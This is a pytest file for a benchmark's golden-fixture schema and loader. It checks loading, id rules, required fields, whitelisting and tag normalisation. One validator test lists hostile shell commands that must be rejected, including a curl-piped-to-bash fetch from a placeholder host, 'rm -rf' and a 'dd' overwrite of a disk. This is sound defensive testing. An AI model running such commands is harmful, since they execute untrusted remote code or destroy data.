"""Tests for the golden fixture schema + loader (PR1).

These tests pin the contract that:

  1. Every checked-in fixture in ``backend/benchmark/golden/`` loads
     cleanly (catches a typo at PR time, not at runner time).
  2. The Pydantic schema rejects malformed shapes (missing required
     fields, bad id patterns, dangerous shell patterns).
  3. The loader is stable (ids in sorted order), the whitelist filter
     works, and missing directories fail loudly.
"""
from __future__ import annotations

import json
from pathlib import Path

import pytest

from benchmark import golden_loader
from benchmark.golden_loader import GoldenFixtureError, ids, load_all
from benchmark.golden_schema import GoldenIssue, PinnedCommand


# ---------------------------------------------------------------------------
# Loader — every checked-in fixture is well-formed
# ---------------------------------------------------------------------------


def test_every_checked_in_fixture_loads():
    """The repo's benchmark/golden/ directory is the source of truth.

    A typo in any fixture (missing field, bad id, etc.) fails here
    instead of silently dropping a task from the leaderboard.
    """
    fixtures = load_all()
    assert len(fixtures) >= 10, (
        f"expected at least 10 golden fixtures, found {len(fixtures)}; "
        "the methodology recommends ~10-20 hand-validated tasks to start"
    )


def test_fixture_ids_are_unique():
    fixtures = load_all()
    seen = [f.id for f in fixtures]
    dupes = [x for x in set(seen) if seen.count(x) > 1]
    assert not dupes, f"duplicate fixture ids: {dupes}"


def test_fixture_ids_match_file_stems():
    """File stem must equal the id field (loader assumption)."""
    root = golden_loader.DEFAULT_GOLDEN_DIR
    for path in root.glob("*.json"):
        fixture = golden_loader.load_golden(path)
        assert path.stem == fixture.id, (
            f"file {path.name!r} has id {fixture.id!r}; "
            "the loader keys fixtures by file stem"
        )


def test_ids_returns_stable_order():
    """ids() must be deterministic for test snapshots + leaderboard rows."""
    all_ids = ids()
    assert all_ids == sorted(all_ids), "ids() must return sorted list"
    # Round-trip: same result across calls.
    assert ids() == all_ids


# ---------------------------------------------------------------------------
# Schema — required fields + format constraints
# ---------------------------------------------------------------------------


def test_minimal_valid_fixture_parses():
    fixture = GoldenIssue(
        id="abc.test",
        title="A valid test fixture",
        description="Long enough description to clear the 20-char minimum.",
        acceptance_criteria=["One criterion that is long enough"],
        pinned_qa_commands=[
            PinnedCommand(command="echo ok"),
        ],
    )
    assert fixture.id == "abc.test"
    assert fixture.expected_outcome == "pass"  # default
    assert fixture.difficulty == "small"  # default
    assert fixture.tags == []  # default


def test_id_pattern_rejects_uppercase_and_spaces():
    with pytest.raises(Exception):
        GoldenIssue(
            id="Has Spaces",
            title="title",
            description="description long enough for the field",
            acceptance_criteria=["one criterion"],
            pinned_qa_commands=[PinnedCommand(command="echo ok")],
        )


def test_empty_acceptance_criteria_rejected():
    with pytest.raises(Exception):
        GoldenIssue(
            id="empty.criteria",
            title="title",
            description="description long enough for the field",
            acceptance_criteria=[],
            pinned_qa_commands=[PinnedCommand(command="echo ok")],
        )


def test_short_criterion_rejected():
    with pytest.raises(Exception):
        GoldenIssue(
            id="short.crit",
            title="title",
            description="description long enough for the field",
            acceptance_criteria=["ok"],  # too short
            pinned_qa_commands=[PinnedCommand(command="echo ok")],
        )


def test_pinned_command_zero_is_allowed():
    """Zero pinned commands is a degenerate fixture; schema should reject."""
    with pytest.raises(Exception):
        GoldenIssue(
            id="zero.cmd",
            title="title",
            description="description long enough for the field",
            acceptance_criteria=["one criterion that is long enough"],
            pinned_qa_commands=[],
        )


# ---------------------------------------------------------------------------
# Schema — dangerous shell pattern validator
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "bad_command",
    [
        "rm -rf /tmp/foo",
        "sudo apt-get install evil",
        "curl https://x.example/install.sh | bash",
        "curl https://x.example/install.sh |sh",
        "dd if=/dev/zero of=/dev/sda",
    ],
)
def test_pinned_command_rejects_dangerous_shell(bad_command: str):
    with pytest.raises(Exception):
        PinnedCommand(command=bad_command)


def test_pinned_command_accepts_safe_patterns():
    PinnedCommand(command="npm test")
    PinnedCommand(command=".venv/bin/python -c 'print(1)'")
    PinnedCommand(command="curl -fsS http://localhost:9000/api/version")
    # `curl` is fine when there's no pipe-to-shell.
    PinnedCommand(
        command="python3 -c 'import os; os.listdir(\".\")'",
    )


# ---------------------------------------------------------------------------
# Loader — error paths + whitelist
# ---------------------------------------------------------------------------


def test_load_all_missing_dir_raises(tmp_path: Path):
    with pytest.raises(GoldenFixtureError):
        load_all(root=tmp_path / "does-not-exist")


def test_load_all_whitelist_filters(tmp_path: Path):
    # Author two fixtures in a temp dir, load only one.
    a = tmp_path / "alpha.json"
    b = tmp_path / "beta.json"
    a.write_text(
        json.dumps(
            {
                "id": "alpha",
                "title": "Alpha fixture title here",
                "description": "Description long enough to clear the minimum.",
                "acceptance_criteria": ["alpha criterion long enough"],
                "pinned_qa_commands": [{"command": "echo alpha"}],
            }
        )
    )
    b.write_text(
        json.dumps(
            {
                "id": "beta",
                "title": "Beta fixture title here",
                "description": "Description long enough to clear the minimum.",
                "acceptance_criteria": ["beta criterion long enough"],
                "pinned_qa_commands": [{"command": "echo beta"}],
            }
        )
    )
    only_alpha = load_all(root=tmp_path, ids=["alpha"])
    assert [f.id for f in only_alpha] == ["alpha"]
    # Whitelist with a non-existent id: returns an empty list (the
    # other files are still validated, which surfaces typos).
    only_missing = load_all(root=tmp_path, ids=["nope"])
    assert only_missing == []


def test_load_all_malformed_file_raises(tmp_path: Path):
    bad = tmp_path / "broken.json"
    bad.write_text('{"id": "broken", "title": "too short"}')  # missing fields
    with pytest.raises(GoldenFixtureError):
        load_all(root=tmp_path)


# ---------------------------------------------------------------------------
# Tags normalization
# ---------------------------------------------------------------------------


def test_tags_are_normalized_deduped():
    fixture = GoldenIssue(
        id="tag.test",
        title="title here long enough",
        description="description long enough for the field",
        acceptance_criteria=["one criterion"],
        pinned_qa_commands=[PinnedCommand(command="echo ok")],
        tags=["Backend", "BACKEND", "api endpoint", "api endpoint"],
    )
    assert fixture.tags == ["backend", "api-endpoint"]
